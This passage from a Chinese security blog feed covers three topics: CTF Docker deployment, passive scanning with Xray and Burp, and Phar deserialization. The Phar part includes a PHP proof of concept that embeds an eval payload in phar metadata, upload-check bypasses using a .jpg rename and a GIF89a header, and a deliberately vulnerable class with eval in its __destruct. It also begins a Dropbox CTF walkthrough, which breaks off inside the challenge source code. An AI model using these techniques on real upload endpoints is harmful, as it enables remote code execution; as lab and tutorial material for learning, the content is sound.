&#x2F;var&#x2F;www&#x2F;html&#x2F;ctfhub.sql;&quot; -uroot -pctfhub \    &amp;&amp; rm &#x2F;var&#x2F;www&#x2F;html&#x2F;ctfhub.sql \    &amp;&amp; rm &#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.php \    &amp;&amp; chmod -R 655 &#x2F;var&#x2F;www&#x2F;html&#x2F;</code></pre><p>解析：</p><p>首先目录</p><pre class="language-bash" data-language="bash"><code class="language-bash">- src- index.php- ctfhub.sql- Dockerfile</code></pre><p>拉去一个lamp镜像，然后将src目录下的文件(<code>ctfrhub.sql&amp;&amp;index.php</code>)复制到容器中的网站根目录下</p><p>随后开启mysql服务，进入数据库，使用<code>mysqladmin</code>来设置初始用户和密码<code>root:ctfhub</code></p><p>然后使用命令创建对应数据库<code>ctfhub</code>并且导入数据库文件<code>ctfhub.sql</code></p><p>然后删除数据库文件<code>ctfhub.sql</code>防止信息泄露，删除<code>phpinfo.php</code>防止<code>php</code>探针泄露危险可利用函数</p><p>最后赋予网站根目录对应权限为<code>655</code>，题目就部署完成了。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xray和burpsuite联动实现被动漏扫</title>
      <link href="/posts/a026b628/"/>
      <url>/posts/a026b628/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/05/24719_69915574_p0_master1200.jpg" alt="69915574_p0_master1200" loading="lazy"><br>所以你只是心动过，并没有坚定的选择我对不对……</p><a id="more"></a><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>准备挖SRC了，还是先准备一下工具吧。看了很多文章，发现一点，大家都有自己的渗透思路，我认为这也是很重要的一点，我也是尝试了建立自己渗透思路，有自己的方式。</p><h1 id="Xray-burpsuite联动被动扫描"><a href="#Xray-burpsuite联动被动扫描" class="headerlink" title="Xray+burpsuite联动被动扫描"></a>Xray+burpsuite联动被动扫描</h1><p>高级版Xray<br>在第一次运行后会生成一个配置文件，config.yaml<br>生成证书，可以进行<code>https</code>的扫描，</p><pre class="language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>xray_windows_amd64.exe genca</code></pre><p>在当前目录生成证书，<br><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/06/17506_image-20210906103421237.png" alt="image-20210906103421237" loading="lazy"><br>导入浏览器(谷歌火狐均可，方法自行百度)</p><p>配置浏览器设置代理（可以使用插件，谷歌火狐都有代理插件)</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/06/67365_image-20210906103005631.png" alt="image-20210906103005631" loading="lazy"><br><code>*gov.cn</code>是必须要排除在外的，直接放包，不做测试。<br>然后就是burpsuite的一些配置</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/06/18774_image-20210906103709211.png" alt="image-20210906103709211" loading="lazy"><br>前提是burp的浏览器代理是与刚设置的浏览器代理一样，我这里默认是8080，所以就补贴图了。<br>然后这些配置基本就算完了。就是开启xray进行手工点击进行扫描了</p><pre class="language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>xray_windows_amd64.exe webscan --listen <span class="token number">127.0</span>.0.1:7777 --html-output result.html</code></pre><p>浏览器打开网站，我这里使用了DVWA的靶场来进行测试了<br>登陆进去之后，浏览器代理挂起来，开始点击，burp那边一直放包。<br>最后生成xray生成result.html漏洞报告。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/06/60239_image-20210906104214988.png" alt="image-20210906104214988" loading="lazy"><br>很强的工具。<br>后期结合rad进行半自动化扫描</p><h1 id="rad-xray-burp半自动化扫描"><a href="#rad-xray-burp半自动化扫描" class="headerlink" title="rad+xray+burp半自动化扫描"></a>rad+xray+burp半自动化扫描</h1><p>xray和burp的配置同上，只是需要在rad在进行一些配置，而且与上面的方法不同的是，burp使用了2021.8.2版本，有内置浏览器，这里使用他的内置浏览器进行。<br>rad配置文件在第一次运行后会生成。</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">exec_path</span><span class="token punctuation">:</span> <span class="token string">""</span>                     <span class="token comment"># 启动chrome的路径</span><span class="token key atrule">disable_headless</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>           <span class="token comment"># 禁用无头模式</span><span class="token key atrule">force_sandbox</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>              <span class="token comment"># 强制开启sandbox；为 false 时默认开启沙箱，但在容器中会关闭沙箱。为true时强制启用沙箱，可能导致在docker中无法使用。</span><span class="token key atrule">enable_image</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>               <span class="token comment"># 启用图片显示</span><span class="token key atrule">parent_path_detect</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>          <span class="token comment"># 是否启用父目录探测功能</span><span class="token key atrule">proxy</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:7777"</span>                         <span class="token comment"># 代理配置</span><span class="token key atrule">user_agent</span><span class="token punctuation">:</span> <span class="token string">""</span>                    <span class="token comment"># 请求user-agent配置</span><span class="token key atrule">domain_headers</span><span class="token punctuation">:</span>                   <span class="token comment"># 请求头配置:[]&#123;domain,map[headerKey]HeaderValue&#125;</span><span class="token punctuation">-</span> <span class="token key atrule">domain</span><span class="token punctuation">:</span> <span class="token string">'*'</span>                     <span class="token comment"># 为哪些域名设置header，glob语法</span>  <span class="token key atrule">headers</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                     <span class="token comment"># 请求头，map[key]value</span><span class="token key atrule">max_depth</span><span class="token punctuation">:</span> <span class="token number">2</span>                     <span class="token comment"># 最大页面深度限制</span><span class="token key atrule">navigate_timeout_second</span><span class="token punctuation">:</span> <span class="token number">10</span>       <span class="token comment"># 访问超时时间，单位秒</span><span class="token key atrule">load_timeout_second</span><span class="token punctuation">:</span> <span class="token number">10</span>           <span class="token comment"># 加载超时时间，单位秒</span><span class="token key atrule">retry</span><span class="token punctuation">:</span> <span class="token number">0</span>                          <span class="token comment"># 页面访问失败后的重试次数</span><span class="token key atrule">page_analyze_timeout_second</span><span class="token punctuation">:</span> <span class="token number">300</span>  <span class="token comment"># 页面分析超时时间，单位秒</span><span class="token key atrule">max_interactive</span><span class="token punctuation">:</span> <span class="token number">1000</span>             <span class="token comment"># 单个页面最大交互次数</span><span class="token key atrule">max_interactive_depth</span><span class="token punctuation">:</span> <span class="token number">10</span>         <span class="token comment"># 页面交互深度限制</span><span class="token key atrule">max_page_concurrent</span><span class="token punctuation">:</span> <span class="token number">10</span>           <span class="token comment"># 最大页面并发（不大于10）</span><span class="token key atrule">max_page_visit</span><span class="token punctuation">:</span> <span class="token number">1000</span>              <span class="token comment"># 总共允许访问的页面数量</span><span class="token key atrule">max_page_visit_per_site</span><span class="token punctuation">:</span> <span class="token number">1000</span>     <span class="token comment"># 每个站点最多访问的页面数量</span><span class="token key atrule">element_filter_strength</span><span class="token punctuation">:</span> <span class="token number">0</span>        <span class="token comment"># 过滤同站点相似元素强度，1-7取值，强度逐步增大，为0时不进行跨页面元素过滤</span><span class="token key atrule">new_task_filter_config</span><span class="token punctuation">:</span>           <span class="token comment"># 检查某个链接是否应该被加入爬取队列</span>  <span class="token key atrule">hostname_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">hostname_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">port_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">port_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">path_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的路径，支持的格式如: test、*test*</span>  <span class="token key atrule">path_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的路径, 支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>           <span class="token comment"># 允许访问的 Query Key，支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 不允许访问的 Query Key, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><span class="token key atrule">request_send_filter_config</span><span class="token punctuation">:</span>       <span class="token comment"># 检查某个请求是否应该被发送</span>  <span class="token key atrule">hostname_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">hostname_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">port_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">port_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">path_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的路径，支持的格式如: test、*test*</span>  <span class="token key atrule">path_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的路径, 支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>           <span class="token comment"># 允许访问的 Query Key，支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 不允许访问的 Query Key, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><span class="token key atrule">request_output_filter_config</span><span class="token punctuation">:</span>     <span class="token comment"># 检查某个请求是否应该被输出</span>  <span class="token key atrule">hostname_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">hostname_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span>  <span class="token key atrule">port_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">port_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的端口, 支持的格式如: 80、80-85</span>  <span class="token key atrule">path_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token comment"># 允许访问的路径，支持的格式如: test、*test*</span>  <span class="token key atrule">path_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment"># 不允许访问的路径, 支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>           <span class="token comment"># 允许访问的 Query Key，支持的格式如: test、*test*</span>  <span class="token key atrule">query_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 不允许访问的 Query Key, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">fragment_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Fragment, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_allowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token comment"># 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span>  <span class="token key atrule">post_key_disallowed</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token comment"># 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span></code></pre><p>可以的话，还能设置一下User-Agent和Cookie，在domain 模块下的headers中添加</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">user_agent</span><span class="token punctuation">:</span> <span class="token string">""</span>                    <span class="token comment"># 请求user-agent配置</span><span class="token punctuation">-</span> <span class="token key atrule">domain</span><span class="token punctuation">:</span> <span class="token string">'*'</span>                     <span class="token comment"># 为哪些域名设置header，glob语法</span>  <span class="token key atrule">headers</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token key atrule">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=uudasdfafaf324324;security=low'</span><span class="token punctuation">&#125;</span>                     <span class="token comment"># 请求头，map[key]value</span></code></pre><p>使用方法</p><pre class="language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>rad_windows_amd64.exe --config<span class="token operator">=</span>xxx.yml -u 目标url</code></pre><p>然后跑完Xray也可以扫到漏洞并生成报告了。</p>]]></content>
      
      
      <categories>
          
          <category> 挖洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Phar反序列化</title>
      <link href="/posts/8a280b82/"/>
      <url>/posts/8a280b82/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/2021/09/06/23172_123230p9tul1xl91jj92c0.jpg" alt="123230p9tul1xl91jj92c0" loading="lazy"><br>成年人的世界里除了孤独就是压力，小时候真傻怎么老是幻想着长大🙄🙄<br>文章同时发布在<a href="https://www.freebuf.com/">FreeBuf</a><br><a href="https://www.freebuf.com/articles/web/305292.html">浅析Phar反序列化</a>——原创奖励</p><a id="more"></a><h1 id="0x00引言"><a href="#0x00引言" class="headerlink" title="0x00引言"></a>0x00引言</h1><p>PHP反序列化常见的是使用<code>unserilize()</code>进行反序列化，除此之外还有其它的反序列化方法，不需要用到<code>unserilize()</code>。就是用到了本文的主要内容——phar反序列化。很多大佬都进行过总结，但是看了这个知识点的比较全的内容。我看了不下二十篇文章，最后写此文为方便自己以后查看。</p><h1 id="0x01Phar相关基础"><a href="#0x01Phar相关基础" class="headerlink" title="0x01Phar相关基础"></a>0x01Phar相关基础</h1><p>Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的<code>meta-data</code>。以扩展反序列化漏洞的攻击面，配合<code>phar://</code>协议使用。</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><ol><li><code>a stub</code>是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li><code>manifest</code>是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li><code>contents</code>是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><p>就是这个文件由四部分组成，每种文件都是有它独特的一种文件格式的，有首有尾。而<code>__HALT_COMPILER();</code>就是相当于图片中的文件头的功能，没有它，图片无法解析，同样的，没有文件头，php识别不出来它是phar文件，也就无法起作用。</p><h2 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>这里测试一下~<br>前提：生成phar文件需要修改php.ini中的配置，将<code>phar.readonly</code>设置为<code>Off</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210730012302.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>生成的phar文件，打开该文件可以看到文件头是<code>&lt;?php __halt_compiler(); ?&gt;</code>以及中间的部分内容是序列化的形式存在于这个文件中。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210730085214.png" loading="lazy"></p><p>该方法在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合phar://伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。<br><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>得知：有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将<code>meta-data</code>进行反序列化，测试后受影响的函数如下：(仿照大佬的图)<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210721152338.png" loading="lazy"><br>这里使用<code>file_get_contents()</code>函数来进行实验。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar://test.phar/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210730090955.png" loading="lazy"><br><code>__HALT_COMPILER();</code>必须大写，小写不会被识别出来。导致无法进行反序列化操作。<br>因为考虑到在上传的时候，可能只会允许上传图片(<code>jpg/png/gif</code>)，上传时将test.phar修改文件扩展名为jpg也可以进行反序列化，不会影响解析。<br>如果对文件头有识别的，也可以使用GIF文件头<code>GIF89a</code>来绕过检测，具体操作与文件上传部分细节类似，不再赘述。</p><h1 id="0x02-CTF题目实战"><a href="#0x02-CTF题目实战" class="headerlink" title="0x02 CTF题目实战"></a>0x02 CTF题目实战</h1><h2 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h2><p>登录注册功能，注册了一个账号，然后进行登录。发现只有一个上传功能，所以就随意上传一个文件，但是发现只能上传图片。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210730094749.png" loading="lazy"><br>所以这里上传一个普通图片来测试。<br>上传成功后存在下载和删除功能，下载发现进行了跳转，并且浏览器不回显，这里抓包查看</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210730095701.png" loading="lazy"><br>可能存在文件读取，这里尝试一下<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210730100308.png" loading="lazy"><br>但是无法读取<code>flag.php</code>所以还需要尝试其他办法，这里读取网站源码，进行查看。</p><pre class="language-php" data-language="php"><code class="language-php">#download.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">#delete.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string 